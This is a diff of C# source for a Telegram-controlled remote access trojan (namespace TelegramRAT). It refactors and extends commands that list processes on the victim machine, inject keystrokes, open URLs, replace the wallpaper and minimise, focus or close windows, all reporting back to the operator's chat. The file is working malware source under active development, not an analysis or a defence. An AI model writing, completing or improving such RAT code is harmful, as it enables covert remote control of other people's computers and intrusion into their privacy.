@@ -17,11 +17,7 @@ using NAudio.Wave;
 using IronPython.Hosting;
 using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
-using AForge;
-using AForge.Video;
 using AForge.Video.DirectShow;
-using Telegram.Bot.Requests;
-
 
 
 namespace TelegramRAT
@@ -77,7 +73,7 @@ namespace TelegramRAT
 #if DEBUG
             await Bot.SendTextMessageAsync(message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: message.MessageId);
 #else
-            await Bot.SendTextMessageAsync(message.Chat.Id, "Error: " + exception.Message, replyToMessageId: model.Message.MessageId);
+            await Bot.SendTextMessageAsync(message.Chat.Id, "Error: " + exception.Message, replyToMessageId: message.MessageId);
 #endif
         }
 
@@ -116,12 +112,6 @@ namespace TelegramRAT
 
             foreach (var update in Updates)
             {
-                if (update.Message.Text == null && update.Message.Caption == null)
-                {
-                    continue;
-                }
-
-                string messageText = update.Message.Type == MessageType.Text ? update.Message.Text : update.Message.Caption;
 
                 var model = BotCommandModel.FromMessage(update.Message, string.Empty);
 
@@ -210,7 +200,7 @@ namespace TelegramRAT
                             return;
                         }
                         string command = model.Args[0];
-                        
+
                         var cmd = commands.Find(cmd => cmd.Command == command);
                         if (cmd == null)
                         {
@@ -369,24 +359,23 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        string Concat = "List of processes: \n";
+                        StringBuilder processesList = new StringBuilder();
+                        processesList.AppendLine("List of processes: ");
                         int i = 1;
                         Process[] processCollection = Process.GetProcesses();
 
                         foreach (Process p in processCollection)
                         {
-
-                            Concat += $"<code>{p.ProcessName}</code> : <code>{p.Id}</code>\n";
+                            processesList.AppendLine($"<code>{p.ProcessName}</code> : <code>{p.Id}</code>");
                             if (i == 50)
                             {
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, Concat, ParseMode.Html);
-                                Concat = "";
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, processesList.ToString(), ParseMode.Html);
+                                processesList.Clear();
                                 i = 0;
                             }
                             i++;
-
                         }
-                        Bot.SendTextMessageAsync(model.Message.Chat.Id, Concat, ParseMode.Html);
+                        Bot.SendTextMessageAsync(model.Message.Chat.Id, processesList.ToString(), ParseMode.Html);
                     }
                     catch (Exception ex)
                     {
@@ -412,16 +401,20 @@ namespace TelegramRAT
 
                             int procId = int.Parse(model.Args[0]);
 
-                            var proc = Process.GetProcessById(procId);
+                            Process proc = Process.GetProcessById(procId);
 
                             string procInfo =
                             $"Process: <b>{proc.ProcessName}</b>\n" +
                             $"Id: {proc.Id}\n" +
                             $"Priority: {proc.PriorityClass}\n" +
-                            $"Priority Boost: {(proc.PriorityBoostEnabled == true ? "enabled" : "disabled")}";
-                            Bot.SendTextMessageAsync(model.Message.Chat.Id, procInfo, ParseMode.Html, replyToMessageId: model.Message.MessageId);
-                        }
+                            $"Priority Boost: {(proc.PriorityBoostEnabled ? "enabled" : "disabled")}\n";
 
+                            if (proc.MainWindowHandle != IntPtr.Zero)
+                                procInfo += $"\nMain Window Handle: <code>0x{proc.MainWindowHandle.ToString("X")}</code>\n";
+
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, procInfo, ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                            
+                        }
                         catch (Exception ex)
                         {
                             ReportError(model.Message, ex);
@@ -773,7 +766,7 @@ namespace TelegramRAT
                 {
                     if (!model.RawArgs.Contains("://"))
                     {
-                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not url", replyToMessageId: model.Message.MessageId);
+                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not url", replyToMessageId: model.Message.MessageId);
                     }
                     ProcessStartInfo info = new ProcessStartInfo()
                     {
@@ -784,7 +777,7 @@ namespace TelegramRAT
 
                     Process.Start(info);
 
-                     Bot.SendTextMessageAsync(model.Message.Chat.Id, "Url opened!", replyToMessageId: model.Message.MessageId);
+                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Url opened!", replyToMessageId: model.Message.MessageId);
                 }
             });
 
@@ -872,37 +865,37 @@ namespace TelegramRAT
                 "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
                 #endregion
                 Example = "/sendinput 48 45 4c 4c 4f (hello)",
-                Execute =  model =>
-                {
-                     Task.Run(() =>
-                    {
-                        try
-                        {
-                            KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
-                            foreach (string arg in model.Args)
-                            {
-                                if (arg.Contains("+"))
-                                {
-                                    int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
-                                    List<int> modified = new List<int>();
-                                    foreach (string vk in arg.Split('+').Skip(1))
-                                    {
-                                        modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
-                                    }
-                                    ks.ModifiedKeyStroke(new int[] { modifier }, modified);
-                                }
-                                else
-                                    ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
-                            }
+                Execute = model =>
+               {
+                   Task.Run(() =>
+                   {
+                       try
+                       {
+                           KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
+                           foreach (string arg in model.Args)
+                           {
+                               if (arg.Contains("+"))
+                               {
+                                   int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
+                                   List<int> modified = new List<int>();
+                                   foreach (string vk in arg.Split('+').Skip(1))
+                                   {
+                                       modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
+                                   }
+                                   ks.ModifiedKeyStroke(new int[] { modifier }, modified);
+                               }
+                               else
+                                   ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
+                           }
 
-                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(model.Message, ex);
-                        }
-                    });
-                },
+                           Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
+                       }
+                       catch (Exception ex)
+                       {
+                           ReportError(model.Message, ex);
+                       }
+                   });
+               },
 
 
             });
@@ -914,57 +907,57 @@ namespace TelegramRAT
                 Description = "Change wallpapers. Don't foreget to attach the image.",
                 Execute = model =>
                 {
-                     Task.Run( () =>
-                    {
-                        try
-                        {
-                            if (model.Message.Type == MessageType.Photo)
-                            {
-                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                                {
-                                    Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
-                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                                }
-                            }
-                            else if (model.Message.Type == MessageType.Document)
-                            {
-                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                                {
-                                    Telegram.Bot.Types.File wallpaperFile =  Bot.GetFileAsync(model.Message.Document.FileId).Result;
-                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                                }
-                            }
-                            else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
-                            {
-                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                                {
-                                    Telegram.Bot.Types.File wallpaperPhoto =  Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
-                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                                }
-                            }
-                            else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
-                            {
-                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                                {
-                                    Telegram.Bot.Types.File wallpaperFile =  Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
-                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                                }
-                            }
-                            else
-                            {
-                                 Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
-                                return;
-                            }
+                    Task.Run(() =>
+                  {
+                      try
+                      {
+                          if (model.Message.Type == MessageType.Photo)
+                          {
+                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                              {
+                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
+                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
+                              }
+                          }
+                          else if (model.Message.Type == MessageType.Document)
+                          {
+                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                              {
+                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
+                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
+                              }
+                          }
+                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
+                          {
+                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                              {
+                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
+                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
+                              }
+                          }
+                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
+                          {
+                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                              {
+                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
+                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
+                              }
+                          }
+                          else
+                          {
+                              Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
+                              return;
+                          }
 
-                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
-                            System.IO.File.Delete("wllppr.png");
-                             Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(model.Message, ex);
-                        }
-                    });
+                          WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                          System.IO.File.Delete("wllppr.png");
+                          Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
+                      }
+                      catch (Exception ex)
+                      {
+                          ReportError(model.Message, ex);
+                      }
+                  });
                 }
             });
 
@@ -975,11 +968,12 @@ namespace TelegramRAT
                 MayHaveNoArgs = false,
                 IgnoreCountArgs = true,
                 Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
-                "<i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
-                "<i>minimize</i> - Minimize window\n\n" +
-                "<i>maximize</i> - Maximize window\n\n" +
-                "<i>restore</i> - Restore size and position of window\n\n" +
-                "<i>close</i> - Close window\n\n",
+                "<i>i</i> | <i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
+                "<i>min</i> | <i>minimize</i> - Minimize window\n\n" +
+                "<i>max</i> | <i>maximize</i> - Maximize window\n\n" +
+                "<i>r</i> | <i>restore</i> - Restore size and position of window\n\n" +
+                "<i>sf</i> | <i>setfocus</i> - Set focus to window" +
+                "<i>c</i> | <i>close</i> - Close window\n\n",
                 Example = "/window close Calculator",
                 Execute = model =>
                 {
@@ -988,11 +982,12 @@ namespace TelegramRAT
                         try
                         {
                             IntPtr hWnd;
-                            if (model.Args[0].ToLower() == "info" && model.Args.Length == 1)
+                            if (model.Args.Length == 1 && (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i"))
                             {
                                 hWnd = WinAPI.GetForegroundWindow();
+
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
-                                string info = "" +
+                                string info =
                                 "Window info\n" +
                                 "\n" +
                                 $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
@@ -1000,7 +995,9 @@ namespace TelegramRAT
                                 $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                 $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
                                 Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                                return;
                             }
+                            
                             if (model.Args.Length > 1)
                             {
                                 if (model.Args[1].Contains("0x"))
@@ -1020,6 +1017,7 @@ namespace TelegramRAT
                                 }
                                 switch (model.Args[0].ToLower())
                                 {
+                                    case "i":
                                     case "info":
                                         Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                         string info = "" +
@@ -1028,31 +1026,37 @@ namespace TelegramRAT
                                         $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                         $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                         $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
+                                        $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);                                        
                                         break;
 
+                                    case "min":
                                     case "minimize":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                         break;
 
+                                    case "max":
                                     case "maximize":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                         break;
 
+                                    case "sf":
                                     case "setfocus":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                         break;
 
+                                    case "r":
                                     case "restore":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                         break;
 
+                                    case "c":
                                     case "close":
                                         WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
@@ -1063,7 +1067,10 @@ namespace TelegramRAT
                                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "No such usage for /window. Type /help window for info.", replyToMessageId: model.Message.MessageId);
                                         return;
                                 }
-
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Only <i>info</i> usage supports no args", ParseMode.Html, replyToMessageId: model.Message.MessageId);
                             }
                         }
                         catch (Exception ex)
@@ -1756,7 +1763,7 @@ namespace TelegramRAT
                         return;
                     }
                     BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);
-                    
+
                     if (newmodel == null)
                     {
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
